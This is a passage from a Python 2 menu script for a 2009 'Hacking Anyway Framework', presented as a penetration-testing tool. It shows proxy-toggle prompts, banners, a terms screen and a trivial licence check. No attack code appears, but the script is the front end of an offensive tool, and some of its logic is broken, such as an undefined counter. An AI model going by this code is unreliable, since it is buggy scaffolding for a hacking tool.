					os.system('CLS')
				why_you_are_remove_this = raw_input("\n\n\n\n\n\n\t[+] Proxy Sucsessfuly removed press any key To Conteneue...")
				anony = 0
			else: 
				if os.name == "posix":
					# Unix/Linux/MacOS/BSD/etc
					os.system('clear')
				elif os.name in ("nt", "dos", "ce"):
					# DOS/Windows
					os.system('CLS')
				hlpptoxy()
		elif bol == '6':
			if anony != 0:
				if os.name == "posix":
					# Unix/Linux/MacOS/BSD/etc
					os.system('clear')
				elif os.name in ("nt", "dos", "ce"):
					# DOS/Windows
					os.system('CLS')
				anony = 0
				anonymise()
				if anony == 0:
					sending_in_dustbin=raw_input("\n\t[+] Because of Failid Proxy It Is Removed presss any key To Conteneue...")
				else:
					sending_to_new_contry=raw_input("\n\t[+] New Proxy Sucsessfuly Applyed Press Any Key To Apply New Seting...")
			else:
				break 
		
		elif bol == '7':
			if anony == 0:
				if os.name == "posix":
					# Unix/Linux/MacOS/BSD/etc
					os.system('clear')
				elif os.name in ("nt", "dos", "ce"):
					# DOS/Windows
					os.system('CLS')
				print "\n\t\t#################################################"
				print "\t\t#  PENETRATION TESTING FRAMEWORK PRE RELEASE    #" 
				print "\t\t#  Copyright (C) 2009 By Ashikali               #"
				print "\t\t#  HACKING ANYWAY FRAMEWORK V 1.0               #" 
				print "\t\t#  Ashikali1208[at]yahoo[dot]com                #"                                   
				print "\t\t#  www.Ashikali.com                             #" 
				print "\t\t#  GNU General Public License                   #"
				print "\t\t#################################################"
				print "\n\t\t   Thanks For Using My Tool Hope You Like This"
				print "\t\t-------------------------------------------------"
				sys.exit(1) 
			else:
				if os.name == "posix":
					# Unix/Linux/MacOS/BSD/etc
					os.system('clear')
				elif os.name in ("nt", "dos", "ce"):
					# DOS/Windows
					os.system('CLS')
				hlpptoxy()
		elif bol == '8':
			if anony == 0:
				bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again")
			else:
				break
		elif  bol == '9':
			if anony == 0:
				bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again")
			else:
				if os.name == "posix":
					# Unix/Linux/MacOS/BSD/etc
					os.system('clear')
				elif os.name in ("nt", "dos", "ce"):
					# DOS/Windows
					os.system('CLS')
				print "\n\t\t#################################################"
				print "\t\t#  PENETRATION TESTING FRAMEWORK PRE RELEASE    #" 
				print "\t\t#  Copyright (C) 2009 By Ashikali               #"
				print "\t\t#  HACKING ANYWAY FRAMEWORK V 1.0               #" 
				print "\t\t#  Ashikali1208[at]yahoo[dot]com                #"                                   
				print "\t\t#  www.Ashikali.com                             #" 
				print "\t\t#  GNU General Public License                   #"
				print "\t\t#################################################"
				print "\n\t\t   Thanks For Using My Tool Hope You Like This"
				print "\t\t-------------------------------------------------"
				sys.exit(1) 
		else:
			bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again")

def atlanta(bikimiki):
	
	if bikimiki != '200':
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		bo=raw_input("\n\t\tYou Have Just Trying To Use Cracked version ")
		sys.exit(1) 
	num = '0'
	while (num != '6'):
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		print "\n\t\t#################################################"
		print "\t\t#  PENETRATION TESTING FRAMEWORK PRE RELEASE    #" 
		print "\t\t#  Copyright (C) 2009 By Ashikali               #"
		print "\t\t#  HACKING ANYWAY FRAMEWORK V 1.0               #"
 		print "\t\t#  General Menu                                 #" 
		print "\t\t#  Ashikali1208[at]yahoo[dot]com                #"                                   
		print "\t\t#  www.Ashikali.com                             #" 
		print "\t\t#  GNU General Public License                   #"
		print "\t\t#################################################"
		print "\n\t\tEnter 1 For Let Me In Framwork"
		print "\n\t\tEnter 2 For View Special Thanks Page"
		print "\n\t\tEnter 3 For Download Resource"
		print "\n\t\tEnter 4 For About This Frameworks"
		print "\n\t\tEnter 5 For Credit Page"
		print "\n\t\tEnter 6 For Exit Completely"
		num=raw_input("\n\t\tEnter Your Choice Here : ")
		if num == '1':
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS')
			wikimiki=900
			usaaa(wikimiki)
		elif num == '2':
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS')
			speth()		
		elif num == '3':
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS')
			downres()
		elif num == '4':
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS')
			hlpindex()
		elif num == '5':
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS')
			creditp()
		elif num == '6':
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS')
			print "\n\t\t#################################################"
			print "\t\t#  PENETRATION TESTING FRAMEWORK PRE RELEASE    #" 
			print "\t\t#  Copyright (C) 2009 By Ashikali               #"
			print "\t\t#  HACKING ANYWAY FRAMEWORK V 1.0               #" 
			print "\t\t#  Ashikali1208[at]yahoo[dot]com                #"                                   
			print "\t\t#  www.Ashikali.com                             #" 
			print "\t\t#  GNU General Public License                   #"
			print "\t\t#################################################"
			print "\n\t\t   Thanks For Using My Tool Hope You Like This"
			print "\t\t-------------------------------------------------"
			sys.exit(1) 
		else: 
			bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again...")



neter=1
if neter >= 0:
	choo= '0'
	while choo !='3':
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		sec=raw_input("Enter Your Licence Key Here : ")
		if sec == '1' and neter>=0:
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS')
				num= '0'
			while (num != '2'):
				if os.name == "posix":
					# Unix/Linux/MacOS/BSD/etc
					os.system('clear')
				elif os.name in ("nt", "dos", "ce"):
					# DOS/Windows
					os.system('CLS')
				print "\n\t\t\t       TERMS & CONDITION"
				print "\t\t\t-------------------------------"
				print "\tThis program is free software: you can redistribute it But Can Not Modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or 2 any later version. This program is distributed in the hope that it will be useful,but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESSFOR A PARTICULAR PURPOSE.  See the GNU General Public License for more details You should have received a copy of the GNU General Public License along with thisprogram. If not, see <http://www.gnu.org/licenses/>. This Framework Is Made For Only Education Purpose. There Is No Authors Responsiblity For Any Damege Or IfTools Is Not Working Proparly. This Is Very Powerfull Tool Which Is Made By Ashikali1208 Specily For Penetration Testers & Security Profationals. Use This Tool Very Carefully. Author is Not Responsible for Aby Damage"
				print "\n\tYou Can Not Use This TooL Without Accept Terms And Conditions"
				print "\n\tEnter 1 For Agree Of This Term And Condition"
				print "\n\tEnter 2 For Exit"
				num=raw_input("\n\tEnter Your Choice Here : ")
				if num == '1':
					if os.name == "posix":
						# Unix/Linux/MacOS/BSD/etc
						os.system('clear')
					elif os.name in ("nt", "dos", "ce"):
						# DOS/Windows
						os.system('CLS')
					bikimiki = '200'
					atlanta(bikimiki)
				elif num == '2':
			
					if os.name == "posix":
						# Unix/Linux/MacOS/BSD/etc
						os.system('clear')
					elif os.name in ("nt", "dos", "ce"):
						# DOS/Windows
						os.system('CLS')
					print "\n\t\t#################################################"
					print "\t\t#  PENETRATION TESTING FRAMEWORK PRE RELEASE    #" 
					print "\t\t#  Copyright (C) 2009 By Ashikali               #"
					print "\t\t#  HACKING ANYWAY FRAMEWORK V 1.0               #" 
					print "\t\t#  Ashikali1208[at]yahoo[dot]com                #"                                   
					print "\t\t#  www.Ashikali.com                             #" 
					print "\t\t#  GNU General Public License                   #"
					print "\t\t#################################################"
					print "\n\t\t   Thanks For Using My Tool Hope You Like This"
					print "\t\t-------------------------------------------------"
					sys.exit(1) 
				else: 
					bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again...")
	
			
		else: 
			bo=raw_input("\n\t\tYour licence key is Invalid")
			counter= counter+1
			if counter==3:
				if os.name == "posix":
					# Unix/Linux/MacOS/BSD/etc
					os.system('clear')
				elif os.name in ("nt", "dos", "ce"):
					# DOS/Windows
					os.system('CLS')
				bo=raw_input("\n\t\tMaximum Failair Occure Application Will Exit ")
				sys.exit(1) 
	
	
	
		
else:
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	bo=raw_input("\n\t\tYour Copy Is Expired Sorry You Should Purchase Its Again")
	
	
	